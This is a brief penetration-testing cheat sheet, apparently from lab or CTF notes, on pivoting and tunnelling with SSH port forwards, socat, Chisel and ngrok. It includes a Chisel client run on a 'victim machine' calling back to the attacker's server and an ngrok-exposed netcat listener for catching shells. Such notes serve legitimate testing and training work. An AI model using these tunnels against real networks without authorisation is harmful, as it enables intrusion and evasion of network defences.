- [SSH](#ssh)
- [Socat](#socat)
- [Chisel](#chisel)
- [Ngrok](#ngrok)
- [References](#references)

## SSH 

**Local PortForward** 

```
ssh –L 5901:10.10.10.48:4492 root@10.10.10.47
```

**Remote PortForward** 

```
ssh –R 9999:localhost:8080 root@10.10.10.48
```

## Socat 

Make sure the machine have socat and if dont please get on that machine a socat binary.

```
./socat tcp-listen:9999,fork tcp:127.0.0.1:25 &
```


## Chisel 

Please make sure both are the same version. Please download the latest release of Chisel on the link below:

https://github.com/jpillora/chisel/releases

```
#On Our Machine
./chisel server -p 4442 -v -reverse

#On Victim Machine
chisel64.exe client 10.10.14.8:4442 R:8200:127.0.0.1:8888
```

## Ngrok 

**Ngrok** - a cross-platform application that enables developers to expose a local development server to the Internet with minimal effort

1. Sign Up - https://dashboard.ngrok.com/

2. Download suitable ngrok for your OS

3. unzip /path/to/ngrok.zip

4. ./ngrok authtoken <AUTH-TOKEN>

```
#TCP
./ngrok tcp 9001

-> Then nc -lnvp 9001

#HTTP
./ngrok http 9001

-> Then python -m SimpleHTTPServer 9001
```


# References 
[1] https://phoenixnap.com/kb/ssh-port-forwarding#htoc-remote-port-forwarding-with-openssh

[2] https://github.com/jpillora/chisel